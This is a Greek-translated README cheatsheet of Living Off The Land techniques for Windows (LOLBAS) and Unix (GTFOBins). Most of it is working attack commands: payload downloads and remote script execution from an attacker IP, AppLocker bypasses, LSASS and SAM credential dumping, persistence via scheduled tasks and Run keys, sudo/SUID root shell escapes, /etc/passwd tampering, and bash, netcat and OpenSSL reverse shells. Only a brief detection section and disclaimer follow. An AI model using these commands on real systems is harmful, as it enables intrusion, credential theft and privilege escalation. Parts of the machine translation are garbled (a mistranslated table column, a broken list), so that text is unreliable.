<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Living Off The Land (LOLBAS & GTFOBins) - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Living Off The Land">
</p>

<p align="center">
  <b>🛠️ Ολοκληρωμένη αναφορά για κατάχρηση νόμιμων προεγκατεστημένης δυαδικών αρχείων συστήματος για την εκτέλεση κώδικα, τη λήψη ωφέλιμων φορτίων και την κλιμάκωση των προνομίων</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Εισαγωγή](#-εισαγωγή)
- [Why Living Off The Land?](#-why-living-off-the-land?)
- [Μέρος 1: Windows LOLBAS](#-part-1-windows-lolbas)
  - [Λήψη και είσοδος αρχείου](#file-download--ingress)
  - [Code Execution & AppLocker Bypass](#code-execution--applocker-bypass)
  - [Credential Dumping (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Reconnaissance & Discovery](#reconnaissance--discovery)
  - [Εμμονή και προγραμματισμένες εργασίες](#persistence--scheduled-tasks)
- [Μέρος 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID & Sudo Shell Escapes](#suid--sudo-shell-escapes)
  - [Αξιοποίηση ανάγνωσης και εγγραφής αρχείων](#file-read--write-exploitation)
  - [Είσοδος δικτύου και αντίστροφα κελύφη](#network-ingress--reverse-shells)
  - [GTFOBins High-Impact Interpreters](#gtfobins-high-impact-interpreters)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
- [Πόροι](#-πόροι)

---

## 🎯 Εισαγωγή

Το **Living Off The Land (LotL)** είναι ένα tradecraft μετά την εκμετάλλευση όπου οι επιτιθέμενοι και οι red teamers χρησιμοποιούν αποκλειστικά νόμιμα, ενσωματωμένα, αξιόπιστα δυαδικά αρχεία συστήματος, σενάρια και βιβλιοθήκες που υπάρχουν ήδη στο λειτουργικό σύστημα.

- **LOLBAS (Windows):** Living Off The Land Binaries, Scripts και Libraries.
- **GTFOBins (Unix/Linux):** Επιμελημένη συλλογή δυαδικών αρχείων Unix που μπορεί να γίνει κατάχρηση για παράκαμψη τοπικών περιορισμών ασφαλείας, διαφυγή περιορισμένων κελύφους και κλιμάκωση προνομίων.

---

## ⚖️ Γιατί να ζεις από τη γη;

.
2. 👁️ **Αποφεύγει AV/EDR με βάση την υπογραφή:** Κανένα ξένο κακόβουλο εκτελέσιμο αρχείο (`.exe`, `.elf`) δεν απορρίπτεται στο δίσκο.
3. 📉 **Χαμηλό λειτουργικό αποτύπωμα:** Μειώνει τις ιατροδικαστικές ανωμαλίες καταγραφής χρησιμοποιώντας εγγενή εργαλεία διαχείρισης.

---

## 🪟 Μέρος 1: Windows LOLBAS

### Λήψη και είσοδος αρχείου

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe & PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Εκτέλεση Κώδικα & Παράκαμψη AppLocker

#### 1. Mshta.exe (Εκτέλεση απομακρυσμένου HTA/VBScript)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (Τεχνική Squiblydoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (Εκτέλεση σεναρίου XSL)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Ντάμπινγκ διαπιστευτηρίων (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (LSASS Dump)
Αποθέστε τη μνήμη διεργασίας LSASS χωρίς να απορρίψετε το Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (Αποθήκευση SAM, SYSTEM και SECURITY Hives)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Αναγνώριση & Ανακάλυψη
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Επιμονή & Προγραμματισμένες Εργασίες
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Μέρος 2: Unix / Linux GTFOBins

### SUID & Sudo Shell Escapes

Όταν ένα δυαδικό έχει σύνολο SUID (`chmod u+s`) ή εκχωρείται στο `sudo -l`, χρησιμοποιήστε το για ένα άμεσο κέλυφος ρίζας:

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Εκμετάλλευση ανάγνωσης και εγγραφής αρχείων

Όταν δεν μπορείτε να δημιουργήσετε ένα κέλυφος απευθείας, χρησιμοποιήστε βοηθητικά προγράμματα ανάγνωσης/εγγραφής αρχείων για να αντικαταστήσετε το `/etc/passwd` ή να διαβάσετε το `/etc/shadow`:

#### Αντικαταστήστε το `/etc/passwd` μέσω Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Διαβάστε ευαίσθητα αρχεία μέσω δυαδικών αρχείων SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Είσοδος Δικτύου & Αντίστροφα Κελύφη

Μεταφέρετε αρχεία και pop κελύφη χωρίς `curl` ή `wget`:

#### 1. Bash Native TCP Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Native Netcat (Χωρίς σημαία `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. OpenSSL κρυπτογραφημένο αντίστροφο κέλυφος
Στον επιτιθέμενο:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
Στο στόχο:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins High-Impact Interpreters

Εάν χορηγηθούν διερμηνείς Sudo / SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Γρήγορος πίνακας αναφοράς

| ΛΣ | Δυαδικό | Σκοπός | Εντολή κατάχρησης |
|----|--------|---------|---------------|
| **Νίκη** | `certutil.exe` | Λήψη αρχείου | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Νίκη** | `mshta.exe` | Απομακρυσμένο HTA Exec | `mshta http://<IP>/payload.hta` |
| **Νίκη** | `regsvr32.exe` | Exec σεναρίου | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Νίκη** | `rundll32.exe` | Χωματερή LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID Shell | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Shell Escape | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Αντικατάσταση αρχείου | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση

1. **Καταγραφή γραμμής εντολών ελέγχου:**
   Ενεργοποιήστε το **Sysmon (Αναγνωριστικό συμβάντος 1)** και το Windows Process Creation Logging (Αναγνωριστικό συμβάντος 4688) με έλεγχο γραμμής εντολών για την παρακολούθηση ανώμαλων ορισμάτων που διαβιβάζονται στα `certutil`, `mshta` και `rundll32`.
2. **Αποκλεισμός κακόβουλων σχέσεων γονέα-παιδιού:**
   Οθόνη `mshta.exe` ή `regsvr32.exe` αναπαραγωγής `cmd.exe` ή `powershell.exe`.
3. **Περιορίστε τις οδηγίες Sudo:**
   Αποφύγετε τους χαρακτήρες μπαλαντέρ (`*`) στο `/etc/sudoers`. Μην επιτρέπετε ποτέ στους χρήστες να εκτελούν προγράμματα επεξεργασίας κειμένου (`vim`, `nano`) ή μεταγλωττιστές ως root.

---

## ⚠️ Νομική αποποίηση ευθύνης

> **ΣΗΜΑΝΤΙΚΟ:** Living Off The Land Οι τεχνικές καταχρώνται αξιόπιστες διοικητικές υπηρεσίες κοινής ωφέλειας. Αυτό το cheatsheet είναι αυστηρά για εξουσιοδοτημένες αξιολογήσεις ασφαλείας, αμυντική σκλήρυνση και εκπαιδευτική μελέτη.

---

## 📚 Πόροι

- [Επίσημο αποθετήριο του έργου LOLBAS](https://lolbas-project.github.io/)
- [Επίσημο αποθετήριο GTFOBins](https://gtfobins.github.io/)
- [MITRE ATT&CK: Subverting Trust Controls (T1564)](https://attack.mitre.org/techniques/T1564/)